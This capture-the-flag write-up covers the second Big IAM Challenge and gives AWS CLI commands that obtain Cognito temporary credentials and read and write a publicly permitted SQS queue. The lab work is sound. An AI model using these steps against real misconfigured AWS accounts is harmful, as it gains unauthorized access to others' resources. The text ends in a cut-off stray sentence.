The Big IAM Challenge - Challenge 2
Problem Statement
The second challenge in The Big IAM Challenge involves an SQS (Simple Queue Service) queue with an IAM policy that allows public access to send and receive messages. The policy allows anyone to perform the `sqs:SendMessage` and `sqs:ReceiveMessage` actions on the `wiz-tbic-analytics-sqs-queue-ca7a1b2` queue.

Solution Commands

To solve this challenge, I used the AWS CLI to obtain temporary credentials from Amazon Cognito, and then used those credentials to send and receive messages from the SQS queue. Below are the steps and commands used:

1. Retrieve Identity ID from Amazon Cognito:
   The first command retrieves an identity ID from Amazon Cognito using the specified identity pool ID.

   
   aws cognito-identity get-id --identity-pool-id "us-east-1:c6f3eb2e-3cb5-404e-93bc-f0bdf7ad042e"
Retrieve Temporary AWS Credentials: The second command retrieves temporary AWS credentials for the specified identity ID. These credentials are used to authenticate subsequent AWS CLI commands.

aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:9ea8f9af-f687-439b-951d-0e83653f6be7"
Verify Temporary Credentials: The third command verifies that the temporary credentials obtained from Amazon Cognito are valid by using sts get-caller-identity.


aws sts get-caller-identity --profile challenge2
Send a Message to the SQS Queue: The fourth command sends a message with the body "Hello, World" to the SQS queue.


aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --message-body "Hello, World" --profile challenge2 --region us-east-1
Receive a Message from the SQS Queue: The fifth command retrieves a message from the SQS queue.


aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --profile challenge2 --region us-east-1
Outcome
In response to the fifth command, I got a link to the HTML page.

Conclusion
This challenge demonstrates the process of obtaining temporary AWS credentials from Amazon Cognito and interacting with an SQS queue using the AWS CLI. The temporary credentials allow for sending and receiving messages from the queue as per the IAM policy.


Now you can add this directly to your GitHub repository, and it will reflect exactly how you've 
